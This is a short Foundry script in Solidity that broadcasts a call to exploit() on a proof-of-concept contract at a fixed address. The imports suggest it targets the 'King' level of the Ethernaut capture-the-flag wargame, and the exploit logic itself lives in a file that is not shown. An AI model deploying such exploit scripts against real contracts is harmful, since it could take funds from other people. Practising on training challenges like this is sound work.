pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "Ethernaut/king_poc.sol";

contract KingPOCScript is Script {

    function run() external {
      uint256 deployerKey = vm.envUint("PRIVATE_KEY");
      vm.startBroadcast(deployerKey);

      KingPOC kingPOC = KingPOC(0xa63e18aF143d65710fd5D4545a2352e8ac5E17E4);

      kingPOC.exploit{value: 0.0001 ether}();

      vm.stopBroadcast();
    }
}